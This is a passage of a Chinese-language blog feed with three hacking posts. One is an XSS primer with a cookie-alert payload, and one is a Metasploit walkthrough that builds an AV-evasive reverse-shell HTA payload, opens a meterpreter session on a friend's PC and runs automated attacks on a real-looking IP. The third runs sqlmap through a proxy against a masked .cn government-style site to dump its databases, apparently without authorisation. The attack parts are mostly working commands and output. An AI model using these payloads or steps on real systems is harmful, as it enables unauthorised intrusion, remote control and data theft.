    
      <category term="二进制" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="二进制" scheme="http://yoursite.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>初探XSS</title>
    <link href="http://yoursite.com/2016/03/26/2016/2016-03-26-%E5%88%9D%E6%8E%A2XSS/"/>
    <id>http://yoursite.com/2016/03/26/2016/2016-03-26-初探XSS/</id>
    <published>2016-03-26T05:34:20.000Z</published>
    <updated>2017-12-29T13:01:16.222Z</updated>
    
    <content type="html"><![CDATA[<p>XSS（Cross Site Scipting），即跨站脚本攻击。是目前Web漏洞中最常见的，没有之一。</p>
<h4 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h4><p>例如下面的一段textbox代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input type=&quot;text&quot; name=&quot;address1&quot; value=&quot;XXX&quot;&gt;</div></pre></td></tr></table></figure>
<p>XXX是来自用户的输入，但是这段代码没有对XXX进行过滤，直接嵌入在代码中，如果用户输入的是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</div></pre></td></tr></table></figure>
<p>观察一下效果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;input type=&quot;text&quot; name=&quot;address1&quot; value=&quot;&quot;/&gt;</div><div class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!- &quot;&gt;</div></pre></td></tr></table></figure>
<p>这样，当事件被触发的时候，JavaScript代码将会被执行。</p>
<p>XSS漏洞的原理就是用户输入的数据变成了代码。其实这也是几乎所有漏洞产生的原因————未能区分数据和代码。</p>
<h4 id="xss工具"><a href="#xss工具" class="headerlink" title="xss工具"></a>xss工具</h4><p>暂时保留</p>
<h4 id="xss类型"><a href="#xss类型" class="headerlink" title="xss类型"></a>xss类型</h4><ul>
<li><p>反射型XSS之Dom-Based XSS<br>*存储型XSS</p>
<p>#####Dom-Based XSS:</p>
<p>*tip：普通反射型XSS（现代浏览器拦截）：</p>
</li>
</ul>
<p>用DVWA尝试一下普通的反射性XSS：</p>
<p><img src="/images/2016/3-26/16-37.png" alt=""></p>
<p>查看网页源代码：搜索一下name</p>
<p><img src="/images/2016/3-26/16-39.png" alt=""></p>
<p>根据闭合情况构造如下的用户输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&quot;&lt;/pre&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</div></pre></td></tr></table></figure>
<p>发现什么都没有。<br>再次查看网页源代码：</p>
<p><img src="/images/2016/3-26/16-53.png" alt=""></p>
<p>在网页中右键点击检查，发现console选项卡中出现了如下情况，是chrome浏览器对反射型xss进行了过滤。</p>
<p><img src="/images/2016/3-26/16-54.png" alt=""></p>
<p>当然如果用户用的是古老版本的IE浏览器，是可以成功的，但是现在有谁还在用呢。。</p>
<p>下面切入正题：DOM-Based XSS:</p>
<p>基本上，DOM-Based XSS的攻击过程就是Bob先建立一个网站，用来偷盗信息，然后再利用XSS构造一个恶意的url，通过各种手段骗取Alice点击这个url，Alice的cookie等信息就会发送到这个url执行。</p>
<p>演示暂时保留。</p>
<h5 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS:"></a>存储型 XSS:</h5>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSS（Cross Site Scipting），即跨站脚本攻击。是目前Web漏洞中最常见的，没有之一。&lt;/p&gt;
&lt;h4 id=&quot;XSS原理&quot;&gt;&lt;a href=&quot;#XSS原理&quot; class=&quot;headerlink&quot; title=&quot;XSS原理&quot;&gt;&lt;/a&gt;XSS原理&lt;/h4&gt;&lt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>metasploit 使用笔记</title>
    <link href="http://yoursite.com/2016/03/24/2016/2016-03-24-metasploit%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2016/03/24/2016/2016-03-24-metasploit使用笔记/</id>
    <published>2016-03-24T05:34:20.000Z</published>
    <updated>2017-12-29T13:01:06.986Z</updated>
    
    <content type="html"><![CDATA[<p>Zebork的黑客之路进行的颇为不同寻常，metasploit是第一个接触到的工具，很少有做渗透的人刚开始会研究这个内网渗透神器吧。对于metasploit研究必须搁置一段时间，因为要花更多的时间去研究Web渗透和软件漏洞（软件漏洞是因为人在江湖，身不由己）。有必要把现在学会的metasploit一些坑点记下来，等到真正开始内网渗透的时候就不会再陷入坑中。</p>
<h3 id="0x01-metasploit初始化服务和数据库"><a href="#0x01-metasploit初始化服务和数据库" class="headerlink" title="0x01 metasploit初始化服务和数据库"></a>0x01 metasploit初始化服务和数据库</h3><p>metasploit初始化服务还是比较简单的，本人没有遇到什么困难，记得打开msfconsole之前敲一段命令。下面代码中的第一行。第二行现在新版的metasploit应该是不能用了，但是敲一下试试，万一运气好呢。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service metasploit start</div><div class="line">service postgresql start</div></pre></td></tr></table></figure>
<p>先打开msfconsole，输入db_status查看数据库连接状态</p>
<p><img src="/images/2016/3-24/18-42.png" alt=""></p>
<p>发现没有连接。</p>
<p>本人实在Debian vps上尝试搭建metasploit而不是kali，所以先下载postgresql。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install postgresql</div><div class="line">service postgresql start</div></pre></td></tr></table></figure>
<p>发现服务开启成功。</p>
<p>坑爹的情况出现了，vps 1G内存已经不够用了。。</p>
<p><img src="/images/2016/3-24/19-22.png" alt=""></p>
<p>看来加载metasploit攻击环境的vps是需要很大的内存的，把这个vps进行resize，增大一下内存。但是这样的vps价格达到了20$每月，平时的时候存储为镜像是个不错的选择，想要攻击的时候再通过镜像创建vps。</p>
<p>resize之后重新打开vps，开启服务，打开msfconsole，看到数据库已经连接完成。</p>
<p><img src="/images/2016/3-24/19-32.png" alt=""></p>
<p>msfconsole中可以打开nmap，不要忘了先apt-get安装</p>
<p><img src="/images/2016/3-24/19-40.png" alt=""></p>
<h3 id="0x02-metasploit自动化攻击模块"><a href="#0x02-metasploit自动化攻击模块" class="headerlink" title="0x02 metasploit自动化攻击模块"></a>0x02 metasploit自动化攻击模块</h3><p>准备工作是需要做好的，因为新版的msf中并没有自动化攻击脚本，我们需要自己下载。我已经下载好了一个。</p>
<p><a href="/extends/db_autopwn.rb">自动攻击模块下载</a></p>
<p>先尝试load这个模块，发现找不到，其实我是想看一下应该保存在哪里。</p>
<p><img src="/images/2016/3-24/19-52.png" alt=""></p>
<p><img src="/images/2016/3-24/19-55.png" alt=""></p>
<p>再次尝试load</p>
<p><img src="/images/2016/3-24/19-56.png" alt=""></p>
<p>用portscan和db_autopwn演示一下自动攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">sf &gt; use auxiliary/scanner/portscan/tcp</div><div class="line">msf auxiliary(tcp) &gt; show options</div><div class="line">Module options (auxiliary/scanner/portscan/tcp):</div><div class="line">   Name         Current Setting  Required  Description</div><div class="line">   ----         ---------------  --------  -----------</div><div class="line">   CONCURRENCY  10               yes       The number of concurrent ports to check per host</div><div class="line">   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</div><div class="line">   RHOSTS                        yes       The target address range or CIDR identifier</div><div class="line">   THREADS      1                yes       The number of concurrent threads</div><div class="line">   TIMEOUT      1000             yes       The socket connect timeout in milliseconds</div><div class="line">msf auxiliary(tcp) &gt; set RHOSTS 112.XX.XX.XX</div><div class="line">RHOSTS =&gt; 112.XX.XX.XX</div><div class="line">msf auxiliary(tcp) &gt; set THREADS 20</div><div class="line">THREADS =&gt; 20</div><div class="line">msf auxiliary(tcp) &gt; run</div></pre></td></tr></table></figure>
<p><img src="/images/2016/3-24/20-26.jpg" alt=""></p>
<p>当扫描完成之后，可以开始自动化攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">msf auxiliary(tcp) &gt; db_autopwn -t -p -r -e</div><div class="line">[-] The db_autopwn command is DEPRECATED</div><div class="line">[-] See http://r-7.co/xY65Zr instead</div><div class="line">[-] </div><div class="line">[-] Warning: The db_autopwn command is not officially supported and exists only in a branch.</div><div class="line">[-]          This code is not well maintained, crashes systems, and crashes itself.</div><div class="line">[-]          Use only if you understand it&apos;s current limitations/issues.</div><div class="line">[-]          Minimal support and development via neinwechter on GitHub metasploit fork.</div><div class="line">[-] </div><div class="line"> [*] Analysis completed in 41 seconds (0 vulns / 0 refs)</div></pre></td></tr></table></figure>
<p>接下来自动化攻击开始。</p>
<p><img src="/images/2016/3-24/20-31.png" alt=""></p>
<p>一般情况下拿不到session，跑着吧</p>
<h3 id="0x03-msfvenom-payload"><a href="#0x03-msfvenom-payload" class="headerlink" title="0x03 msfvenom payload"></a>0x03 msfvenom payload</h3><p>好玩的来了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=175.xxx.xxx.xxx lport=8081 -f hta-psh -o test.hta</div></pre></td></tr></table></figure>
<p>一般来说windows的payload多为exe格式，但是win7之后可以尝试使用hta，更容易达到免杀的效果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; show options</div><div class="line">Module options (exploit/multi/handler):</div><div class="line">   Name  Current Setting  Required  Description</div><div class="line">   ----  ---------------  --------  -----------</div><div class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</div><div class="line">   LHOST                      yes       The listen address</div><div class="line">   LPORT     4444             yes       The listen port</div><div class="line">   Exploit target:</div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Wildcard Target</div><div class="line">   msf exploit(handler) &gt; set LHOST XX.XX.XX.XX</div><div class="line">LHOST =&gt; XX.XX.XX.XX</div><div class="line">msf exploit(handler) &gt; set LPORT 8081</div><div class="line">LPORT =&gt; 8081</div><div class="line">msf exploit(handler) &gt; show options</div><div class="line">Module options (exploit/multi/handler):</div><div class="line">   Name  Current Setting  Required  Description</div><div class="line">   ----  ---------------  --------  -----------</div><div class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</div><div class="line">   LHOST     XX.XX.XX.XX   yes       The listen address</div><div class="line">   LPORT     8081             yes       The listen port</div><div class="line">Exploit target:</div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Wildcard Target</div><div class="line">msf exploit(handler) &gt; exploit</div><div class="line">[*] Started reverse TCP handler on XX.XX.XX.XX:8081 </div><div class="line">[*] Starting the payload handler...</div><div class="line">[*] Sending stage (1189423 bytes) to XX.XX.XX.XX</div><div class="line">[*] Meterpreter session 1 opened (XX.XX.XX.XX:8081 -&gt; XX.XX.XX.XX:3186) at 2016-03-24 09:47:00 -0400</div></pre></td></tr></table></figure>
<p>键入help命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; getuid</div><div class="line">Server username: XXXXX\XXXX</div><div class="line">meterpreter &gt; sysinfo</div><div class="line">Computer        : XXXXX-PC</div><div class="line">OS              : Windows 10 (Build 10586).</div><div class="line">Architecture    : x64</div><div class="line">System Language : zh_CN</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 2</div><div class="line">Meterpreter     : x64/win64</div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
<p>其实我是用哥们的电脑测试的，为了好玩，我给他上传了一个txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; upload /tmp/hello.txt</div><div class="line">[*] uploading  : /tmp/hello.txt -&gt; /tmp/hello.txt</div><div class="line">[*] uploaded   : /tmp/hello.txt -&gt; /tmp/hello.txt</div><div class="line">meterpreter &gt; shell</div><div class="line">...</div><div class="line">C:\tmp&gt;notepad hello.txt</div><div class="line">notepad hello.txt</div><div class="line">C:\tmp&gt;</div></pre></td></tr></table></figure>
<p>然后就可以听到哥们的叫声啦～</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Zebork的黑客之路进行的颇为不同寻常，metasploit是第一个接触到的工具，很少有做渗透的人刚开始会研究这个内网渗透神器吧。对于metasploit研究必须搁置一段时间，因为要花更多的时间去研究Web渗透和软件漏洞（软件漏洞是因为人在江湖，身不由己）。有必要把现在学
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>awvs+sqlmap傻瓜注入</title>
    <link href="http://yoursite.com/2016/03/22/2016/2016-03-22-awvs+sqlmap%E5%82%BB%E7%93%9C%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2016/03/22/2016/2016-03-22-awvs+sqlmap傻瓜注入/</id>
    <published>2016-03-22T05:34:20.000Z</published>
    <updated>2017-12-29T13:01:00.407Z</updated>
    
    <content type="html"><![CDATA[<p>虽然用工具比较low，但是先用工具，也许是走的最快的一条路。</p>
<h4 id="0x01-工具列表："><a href="#0x01-工具列表：" class="headerlink" title="0x01 工具列表："></a>0x01 工具列表：</h4><ul>
<li>awvs 可以在吾爱破解论坛上下载</li>
<li><p>sqlmap 注入神器</p>
<p>####0x02 扫描漏洞：</p>
</li>
<li><p>填入要扫描的网站url</p>
</li>
</ul>
<p><a href="https://zebork.github.io/images/2016/3-22/20-09.png" target="_blank" rel="external"></a><br><img src="https://zebork.github.io/images/2016/3-22/20-09.png" width="550" height="480"></p>
<ul>
<li>选择相关联的url</li>
</ul>
<p><a href="https://zebork.github.io/images/2016/3-22/20-18.png" target="_blank" rel="external"></a><br><img src="https://zebork.github.io/images/2016/3-22/20-18.png" width="550" height="480"></p>
<ul>
<li>经过一段时间的扫描之后，漏洞信息在列表中显示</li>
</ul>
<p><a href="https://zebork.github.io/images/2016/3-23/09-55.png" target="_blank" rel="external"></a><br><img src="https://zebork.github.io/images/2016/3-23/09-55.png" width="550" height="550"></p>
<ul>
<li>右侧可以看到每一个漏洞的介绍和对应的信息，</li>
</ul>
<p><a href="https://zebork.github.io/images/2016/3-23/09-57.png" target="_blank" rel="external"></a><br><img src="https://zebork.github.io/images/2016/3-23/09-57.png" width="550" height="550"></p>
<h4 id="0x03-用sqlmap攻击注入点"><a href="#0x03-用sqlmap攻击注入点" class="headerlink" title="0x03 用sqlmap攻击注入点"></a>0x03 用sqlmap攻击注入点</h4><p><a href="https://zebork.github.io/images/2016/3-22/21-12.png" target="_blank" rel="external"></a><br><img src="https://zebork.github.io/images/2016/3-22/21-12.png" width="550" height="250"><br>攻击代码（用proxychains挂代理）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains sqlmap -u http://xx.xx.cn/ACTIONSHOWFILES.APPPROCESS?FolderID=102%20AND%203*2*1%3d6%20AND%20998%  --risk 3 --level 5 --dbs</div></pre></td></tr></table></figure>
<p><a href="https://zebork.github.io/images/2016/3-22/21-25.png" target="_blank" rel="external"></a><br><img src="https://zebork.github.io/images/2016/3-22/21-25.png" width="550" height="80"></p>
<p>看到数据库是Oracle，Oracle数据库的提权是个坑，如果成功拿到权限，会在下一篇叙述。</p>
<p><a href="https://zebork.github.io/images/2016/3-22/21-26.png" target="_blank" rel="external"></a><br><img src="https://zebork.github.io/images/2016/3-22/21-26.png" width="550" height="200"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然用工具比较low，但是先用工具，也许是走的最快的一条路。&lt;/p&gt;
&lt;h4 id=&quot;0x01-工具列表：&quot;&gt;&lt;a href=&quot;#0x01-工具列表：&quot; class=&quot;headerlink&quot; title=&quot;0x01 工具列表：&quot;&gt;&lt;/a&gt;0x01 工具列表：&lt;/h4&gt;&lt;ul
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
</feed>
